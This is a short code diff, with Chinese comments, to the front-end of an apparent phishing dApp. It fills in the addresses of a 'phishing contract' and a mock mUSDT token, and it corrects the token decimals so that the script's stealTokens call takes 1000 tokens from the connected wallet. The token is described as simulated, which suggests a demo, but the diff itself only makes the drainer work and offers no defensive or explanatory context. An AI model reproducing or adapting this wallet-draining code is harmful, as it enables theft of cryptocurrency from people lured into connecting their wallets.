@@ -78,9 +78,9 @@
     // 請將以下地址替換成你實際部署的合約地址
 
     // 惡意合約（Phishing Contract）地址
-    const PHISHING_CONTRACT_ADDRESS = "0x..."; 
+    const PHISHING_CONTRACT_ADDRESS = "0x5f1caa852a7232336406daf6b13b7f0ee56ace42"; 
     // 你部署的 mUSDT 代幣合約地址
-    const MUSDT_CONTRACT_ADDRESS = "0x..."; 
+    const MUSDT_CONTRACT_ADDRESS = "0xbd7ba6764f2b0a5cf4e3e1f74a0e925e4dd05e4b"; 
 
     // 惡意合約的 ABI，只需要包含 stealTokens 函數
     const phishingABI = [
@@ -161,8 +161,8 @@
             const userAddress = await signer.getAddress();
             
             // 這裡假設我們要偷 1000 個 mUSDT
-            // 確保這裡的單位與你的 mUSDT 代幣小數點位數一致（我們模擬的 mUSDT 是 6 位小數）
-            const amountToSteal = ethers.utils.parseUnits("1000", 6);
+            // 確保這裡的單位與你的 mUSDT 代幣小數點位數一致（我們模擬的 mUSDT 是 18 位小數）
+            const amountToSteal = ethers.utils.parseUnits("1000", 18);
 
             console.log("發送竊取代幣交易中...");
             // 呼叫惡意合約的 stealTokens 函數
